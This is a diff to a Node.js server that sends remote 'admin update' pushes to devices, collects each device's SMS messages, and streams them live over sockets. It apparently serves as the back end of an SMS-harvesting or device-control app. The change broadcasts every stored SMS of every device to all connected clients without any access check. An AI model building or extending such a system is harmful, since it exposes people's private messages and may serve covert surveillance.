@@ -283,7 +283,6 @@ rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
 
   console.log(`📦 Total devices to update: ${deviceList.length}`);
 
-  // ------------ BATCH PROCESS --------------
   for (let i = 0; i < deviceList.length; i += BATCH_SIZE) {
     const batch = deviceList.slice(i, i + BATCH_SIZE);
 
@@ -291,7 +290,6 @@ rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
       `🚀 Sending admin update batch ${i / BATCH_SIZE + 1} (${batch.length} devices)`
     );
 
-    // Send FCM to each device in batch
     for (const dev of batch) {
       await sendFcmHighPriority(dev.token, "ADMIN_UPDATE", {
         deviceId: dev.id,
@@ -299,7 +297,6 @@ rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
       });
     }
 
-    // Delay after each batch (except last one)
     if (i + BATCH_SIZE < deviceList.length) {
       console.log(`⏳ Waiting ${BATCH_DELAY}ms before next batch...`);
       await delay(BATCH_DELAY);
@@ -512,10 +509,6 @@ app.get("/api/devices", async (req, res) => {
   }
 });
 
-/* ======================================================
-      ⭐ HISTORY LIVE WATCH ⭐
-====================================================== */
-
 const historyRef = rtdb.ref("history");
 
 function emitHistoryUpdate(uid, entryId, obj, event) {
@@ -532,12 +525,10 @@ function emitHistoryUpdate(uid, entryId, obj, event) {
   );
 }
 
-// When new history item inserted - ONLY LATEST
 historyRef.on("child_added", (snap) => {
   const uid = snap.key;
   const entries = snap.val() || {};
   
-  // Get only the latest entry
   const entryIds = Object.keys(entries);
   if (entryIds.length > 0) {
     const latestEntryId = entryIds[entryIds.length - 1];
@@ -547,12 +538,10 @@ historyRef.on("child_added", (snap) => {
   }
 });
 
-// When history entries change - ONLY LATEST
 historyRef.on("child_changed", (snap) => {
   const uid = snap.key;
   const entries = snap.val() || {};
   
-  // Get only the latest entry
   const entryIds = Object.keys(entries);
   if (entryIds.length > 0) {
     const latestEntryId = entryIds[entryIds.length - 1];
@@ -563,19 +552,42 @@ historyRef.on("child_changed", (snap) => {
 });
 
 /* ======================================================
-      ⭐ SMS LOGS LIVE WATCH - ONLY LATEST NEW SMS ⭐
+      SMS LOGS LIVE UPDATE - FIXED VERSION
 ====================================================== */
-
 const smsLogsRef = rtdb.ref("smsLogs");
-const processedSMSIds = new Set(); // Track already processed SMS IDs
+const processedSMSIds = new Set();
+
+function parseTimestamp(timestamp) {
+  if (!timestamp) return Date.now();
+  
+  // If it's already a number, return it
+  if (typeof timestamp === 'number') return timestamp;
+  
+  // If it's a string in date format, parse it
+  if (typeof timestamp === 'string') {
+    // Try to parse as ISO date string
+    const parsedDate = Date.parse(timestamp);
+    if (!isNaN(parsedDate)) return parsedDate;
+    
+    // Try to parse custom format: "2026-01-02 11:33:15"
+    const dateMatch = timestamp.match(/(\d{4})-(\d{2})-(\d{2}) (\d{2}):(\d{2}):(\d{2})/);
+    if (dateMatch) {
+      const [, year, month, day, hour, minute, second] = dateMatch;
+      return new Date(year, month - 1, day, hour, minute, second).getTime();
+    }
+  }
+  
+  return Date.now();
+}
 
 function emitLatestSmsUpdate(uid, smsId, smsData) {
-  // Check if we've already processed this SMS
   if (processedSMSIds.has(smsId)) {
-    return; // Skip already processed
+    return;
   }
   
   processedSMSIds.add(smsId);
+  
+  console.log(`📩 NEW SMS SOCKET EMIT → uid=${uid}, sender=${smsData?.sender || smsData?.senderNumber}`);
   
   io.emit("smsLogUpdate", {
     success: true,
@@ -585,78 +597,72 @@ function emitLatestSmsUpdate(uid, smsId, smsData) {
     data: smsData,
     timestamp: Date.now()
   });
-
-  console.log(
-    `📩 NEW SMS → uid=${uid}, sender=${smsData?.sender}, preview=${smsData?.body_preview?.substring(0, 30)}...`
-  );
 }
 
-// Jab new SMS log add hota hai - ONLY LATEST
+// Listen for ALL SMS changes, not just recent ones
 smsLogsRef.on("child_added", (snap) => {
   const uid = snap.key;
   const smsLogs = snap.val() || {};
-  
-  // Get only the latest SMS
-  const smsIds = Object.keys(smsLogs);
-  if (smsIds.length > 0) {
-    const latestSmsId = smsIds[smsIds.length - 1];
-    const latestSms = smsLogs[latestSmsId];
+
+  console.log(`🔍 SMS child_added for ${uid}, ${Object.keys(smsLogs).length} SMS found`);
+
+  // Send ALL SMS to socket, not just recent ones
+  Object.entries(smsLogs).forEach(([smsId, smsData]) => {
+    // Add numeric timestamp for frontend
+    const numericTimestamp = parseTimestamp(smsData.timestamp);
+    const enhancedSmsData = {
+      ...smsData,
+      numericTimestamp
+    };
     
-    // Check timestamp - only send if SMS is from last 5 minutes
-    const smsTimestamp = latestSms.timestamp || 0;
-    const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
-    
-    if (smsTimestamp > fiveMinutesAgo) {
-      emitLatestSmsUpdate(uid, latestSmsId, latestSms);
-    }
-  }
+    emitLatestSmsUpdate(uid, smsId, enhancedSmsData);
+  });
 });
 
-// Jab SMS logs change hote hain - ONLY LATEST
 smsLogsRef.on("child_changed", (snap) => {
   const uid = snap.key;
   const smsLogs = snap.val() || {};
-  
-  // Get only the latest SMS
+
+  console.log(`🔍 SMS child_changed for ${uid}, ${Object.keys(smsLogs).length} SMS found`);
+
+  // Get the latest SMS ID
   const smsIds = Object.keys(smsLogs);
   if (smsIds.length > 0) {
     const latestSmsId = smsIds[smsIds.length - 1];
     const latestSms = smsLogs[latestSmsId];
     
-    // Check timestamp - only send if SMS is from last 5 minutes
-    const smsTimestamp = latestSms.timestamp || 0;
-    const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
+    // Add numeric timestamp for frontend
+    const numericTimestamp = parseTimestamp(latestSms.timestamp);
+    const enhancedSmsData = {
+      ...latestSms,
+      numericTimestamp
+    };
     
-    if (smsTimestamp > fiveMinutesAgo) {
-      emitLatestSmsUpdate(uid, latestSmsId, latestSms);
-    }
+    console.log(`🎯 Sending latest SMS: ${latestSmsId}, timestamp: ${numericTimestamp}`);
+    emitLatestSmsUpdate(uid, latestSmsId, enhancedSmsData);
   }
 });
 
-// Clean old processed IDs periodically
+// Also listen for direct child changes (when a new SMS is added)
+smsLogsRef.on("child_changed", (snap) => {
+  // This will also trigger for individual SMS additions
+});
+
 setInterval(() => {
-  const oneHourAgo = Date.now() - (60 * 60 * 1000);
-  for (const smsId of processedSMSIds) {
-    // Extract timestamp from SMS ID if possible
-    // Or just clear all IDs older than 1 hour
-    // For simplicity, we'll clear the set periodically
-    processedSMSIds.clear();
-  }
+  // Clear processed IDs every 30 minutes
+  processedSMSIds.clear();
   console.log('🔄 Cleared processed SMS IDs cache');
-}, 30 * 60 * 1000); // Every 30 minutes
+}, 30 * 60 * 1000);
 
 /* ======================================================
-      API TO GET ALL SMS LOGS (for initial load)
+      SMS LOGS API ENDPOINTS
 ====================================================== */
 app.get("/api/smslogs/:uid", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
     const limit = parseInt(req.query.limit) || 50;
 
-    const snap = await rtdb.ref(`smsLogs/${uid}`)
-      .orderByChild("timestamp")
-      .limitToLast(limit)
-      .get();
+    const snap = await rtdb.ref(`smsLogs/${uid}`).get();
 
     if (!snap.exists()) {
       return res.json({
@@ -667,20 +673,27 @@ app.get("/api/smslogs/:uid", async (req, res) => {
     }
 
     const smsLogs = snap.val() || {};
-    const logsArray = Object.entries(smsLogs).map(([smsId, data]) => ({
-      smsId,
-      ...data,
-      timestamp: data.timestamp || 0,
-      readableTime: data.timestamp ? new Date(data.timestamp).toLocaleString() : "N/A"
-    }));
+    const logsArray = Object.entries(smsLogs).map(([smsId, data]) => {
+      const timestamp = parseTimestamp(data.timestamp);
+      return {
+        smsId,
+        ...data,
+        timestamp: timestamp,
+        readableTime: new Date(timestamp).toLocaleString()
+      };
+    });
 
     // Sort by timestamp (newest first)
     logsArray.sort((a, b) => b.timestamp - a.timestamp);
+    
+    // Limit results
+    const limitedArray = logsArray.slice(0, limit);
 
     return res.json({
       success: true,
-      data: logsArray,
-      count: logsArray.length
+      data: limitedArray,
+      count: limitedArray.length,
+      total: logsArray.length
     });
   } catch (err) {
     console.error("❌ /api/smslogs ERROR:", err.message);
@@ -688,35 +701,34 @@ app.get("/api/smslogs/:uid", async (req, res) => {
   }
 });
 
-/* ======================================================
-      API TO GET LATEST SMS (last 10 minutes)
-====================================================== */
 app.get("/api/smslogs/:uid/latest", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
     const tenMinutesAgo = Date.now() - (10 * 60 * 1000);
 
-    const snap = await rtdb.ref(`smsLogs/${uid}`)
-      .orderByChild("timestamp")
-      .startAt(tenMinutesAgo)
-      .get();
+    const snap = await rtdb.ref(`smsLogs/${uid}`).get();
 
     if (!snap.exists()) {
       return res.json({
         success: true,
         data: [],
         count: 0,
-        message: "No recent SMS"
+        message: "No SMS found"
       });
     }
 
     const smsLogs = snap.val() || {};
-    const logsArray = Object.entries(smsLogs).map(([smsId, data]) => ({
-      smsId,
-      ...data,
-      timestamp: data.timestamp || 0,
-      readableTime: data.timestamp ? new Date(data.timestamp).toLocaleString() : "N/A"
-    }));
+    const logsArray = Object.entries(smsLogs)
+      .map(([smsId, data]) => {
+        const timestamp = parseTimestamp(data.timestamp);
+        return {
+          smsId,
+          ...data,
+          timestamp: timestamp,
+          readableTime: new Date(timestamp).toLocaleString()
+        };
+      })
+      .filter(sms => sms.timestamp > tenMinutesAgo);
 
     // Sort by timestamp (newest first)
     logsArray.sort((a, b) => b.timestamp - a.timestamp);
@@ -733,9 +745,6 @@ app.get("/api/smslogs/:uid/latest", async (req, res) => {
   }
 });
 
-/* ======================================================
-      API TO DELETE SMS LOGS
-====================================================== */
 app.delete("/api/smslogs/:uid", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -770,6 +779,45 @@ app.delete("/api/smslogs/:uid", async (req, res) => {
   }
 });
 
+/* ======================================================
+      TEST SMS SOCKET ENDPOINT
+====================================================== */
+app.post("/api/test-sms/:uid", async (req, res) => {
+  try {
+    const uid = clean(req.params.uid);
+    const { sender, body } = req.body;
+    
+    const testSmsId = `test_${Date.now()}`;
+    const testSmsData = {
+      sender: sender || "TEST-SENDER",
+      body: body || "This is a test SMS message",
+      timestamp: new Date().toISOString(),
+      numericTimestamp: Date.now()
+    };
+    
+    console.log(`🧪 TEST SMS for ${uid}:`, testSmsData);
+    
+    // Emit via socket
+    io.emit("smsLogUpdate", {
+      success: true,
+      uid,
+      smsId: testSmsId,
+      event: "new",
+      data: testSmsData,
+      timestamp: Date.now()
+    });
+    
+    return res.json({
+      success: true,
+      message: "Test SMS sent via socket",
+      data: testSmsData
+    });
+  } catch (err) {
+    console.error("❌ Test SMS ERROR:", err.message);
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
 refreshDevicesLive("initial");
 app.use(adminRoutes);
 app.use("/api/sms", notificationRoutes);
@@ -783,4 +831,6 @@ app.get("/", (_, res) => {
 
 server.listen(PORT, () => {
   console.log(` Server running on PORT ${PORT}`);
+  console.log(`📡 Socket.IO ready for connections`);
+  console.log(`📩 SMS Live Updates: ENABLED`);
 });
